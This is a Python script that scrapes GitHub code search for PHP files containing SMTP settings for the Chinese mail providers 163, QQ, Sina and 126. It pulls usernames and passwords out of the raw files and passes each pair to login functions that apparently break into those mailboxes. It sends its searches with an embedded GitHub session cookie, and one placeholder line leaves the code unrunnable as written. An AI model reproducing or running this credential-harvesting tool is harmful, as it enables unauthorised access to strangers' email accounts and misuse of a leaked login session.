# -*- coding: utf-8 -*-
import requests,sys
from bs4 import BeautifulSoup
from Mail_Modules import maillogin_163,maillogin_qq,maillogin_sina,maillogin_126
global urllist
urllist = []


def mailfilter(list,mod):
    usern = ''
    password =''
    for url in list:
        try:
            page = requests.get(url).content

            page = page.split()

            for index in range(len(page)):
                if 'user' in page[index]:
                    usern = page[index+2].strip(',').replace("'","")
                #print user
                if 'pass' in page[index]:
                    password = page[index+2].strip(',').replace("'","")
                #print password
        except:
            pass
        if mod == '163':
            maillogin_163(usern,password,url)
        if mod == 'qq':
            maillogin_qq(usern,password,url)
        if mod == 'sina':
            maillogin_sina(usern,password,url)
        if mod == '126':
            maillogin_126(usern,password,url)

def read_page(keyword,pages):
    pages = int(pages)
    print ('在这里输入关键字 '+keyword)
    print ('Scanning '+str(pages)+' pages from Github!')
    for page in range(pages):
        headers = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 115Browser/7.2.5'
        cookie = {"Cookie":"_octo=GH1.1.463111735.1515934854; logged_in=yes; dotcom_user=AGLcaicai; _ga=GA1.2.1343688183.1515934854; tz=Asia%2FShanghai; _gh_sess=emdSNnJiRVVkNkljL25XZ25aZkFKMUZUTHQ4WDBYeExWaXYzeEtMRUZCaXEvZTVUSitOWEJjakpUM3JUUE9PT3QzVlFueW95SVljc1oyZ29yTEE0d3FXYkN6Njk2L0d5WUh3cmJrOVA4TzFYS0hPemIxV001Y0tjdCt0T05NbnNMRGxuYTlQZFhzaCtTa2tUb3R0dTljcVhRNTM3R0ZYRE5SRXdRVXYyZ1dGWUR1SngrY2EyMHhPSHlmVjFTdEloWFFZQTdTa3VDT2xRNXpsbFY0SGdxWFJFdWNHY0FqS1dyS1BFMjZKcjk3ZVRXazJQaTJTeDNFaUJEbUkyUUJ4OHVCRTVxVjZ1TFlOakZWMzRuSHJIOElBR2VKdVdYb3ltNEk0TThXcGlrK0Z1UDV2N2I0SG9DOTRUUVhwd3dQdXQwbkpQSk91ZFBKUEQ0SjBnU0pWbytmNzA0MTVHN3E3M09DYmFkZzlTaWIyUjl6UERYT3d3cjJuZWFyMnlDcjZsL0oxMkVmNURoRWU3VkpQL0dORlQ1ZVQ4Q3BGRjdQR2VmTHNaRXNzbWhKST0tLWtIcDg2NHI0L3BvdGNsMEVEeDl3amc9PQ%3D%3D--979d4dc28bd3acd3f84e9120ed8aa3bc168b0676; user_session=w6USaj7nIVpHmzlaAIuzBT5d_66A6nLmOCPlm7BmPTIVXO-e; __Host-user_session_same_site=w6USaj7nIVpHmzlaAIuzBT5d_66A6nLmOCPlm7BmPTIVXO-e"}
        url = 'https://github.com/search?l=PHP&p='+str(page)+'&q='+keyword+'&type=Code&utf8=%E2%9C%93'
        print ('正在抓取第'+str(page)+'页!')
        pagecon = requests.get(url,cookies = cookie).content
        soup = BeautifulSoup(pagecon,"html.parser")
        for link in soup.find_all('a'):
            url = link.get('href')
            if 'blob' in url:
                url = url.split('#')[0]
                url = url.split('blob/')[0]+url.split('blob/')[1]
                urllist.append('https://raw.githubusercontent.com'+url)
pages = 在这里输入搜索页数
#pages = sys.argv[1]
read_page('smtp+163.com',pages)
urllist = list(set(urllist))
mailfilter(urllist,'163')
urllist =[]
read_page('smtp+qq.com',pages)
urllist = list(set(urllist))
mailfilter(urllist,'qq')
urllist =[]
read_page('smtp+sina.com',pages)
urllist = list(set(urllist))
mailfilter(urllist,'sina')
urllist =[]
read_page('smtp+126.com',pages)
urllist = list(set(urllist))
mailfilter(urllist,'126')
